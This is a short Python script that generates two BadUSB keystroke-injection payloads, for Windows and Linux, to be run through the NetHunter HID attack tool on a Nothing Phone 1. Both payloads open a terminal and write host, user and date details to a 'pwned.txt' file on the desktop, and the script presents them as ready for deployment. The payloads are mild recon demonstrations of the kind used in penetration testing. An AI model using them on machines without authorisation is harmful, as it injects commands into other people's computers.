#!/usr/bin/env python3
# NetHunter BadUSB Generator for Nothing Phone 1

import sys
import os

def create_windows_payload():
    payload = '''# Windows Recon Payload
DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING echo "NetHunter Attack - Nothing Phone 1" > %USERPROFILE%\\Desktop\\pwned.txt
ENTER
STRING echo "System: %COMPUTERNAME%" >> %USERPROFILE%\\Desktop\\pwned.txt
ENTER
STRING echo "User: %USERNAME%" >> %USERPROFILE%\\Desktop\\pwned.txt
ENTER
STRING echo "Date: %date% %time%" >> %USERPROFILE%\\Desktop\\pwned.txt
ENTER
STRING exit
ENTER'''
    
    with open('windows-recon.txt', 'w') as f:
        f.write(payload)
    print("✅ Windows payload created: windows-recon.txt")

def create_linux_payload():
    payload = '''# Linux Recon Payload
DELAY 1000
CTRL ALT t
DELAY 1000
STRING echo "NetHunter Linux Attack" > ~/Desktop/pwned.txt
ENTER
STRING echo "User: $USER" >> ~/Desktop/pwned.txt
ENTER  
STRING echo "System: $(uname -a)" >> ~/Desktop/pwned.txt
ENTER
STRING echo "Date: $(date)" >> ~/Desktop/pwned.txt
ENTER
STRING exit
ENTER'''
    
    with open('linux-recon.txt', 'w') as f:
        f.write(payload)
    print("✅ Linux payload created: linux-recon.txt")

if __name__ == "__main__":
    print("🎯 NetHunter BadUSB Payload Generator")
    print("=====================================")
    
    create_windows_payload()
    create_linux_payload()
    
    print("\n📋 Usage on NetHunter device:")
    print("1. Copy payload file to phone")
    print("2. Enable HID in NetHunter app")
    print("3. Use NetHunter HID Attack tool")
    print("\n🎯 Payloads ready for deployment!")
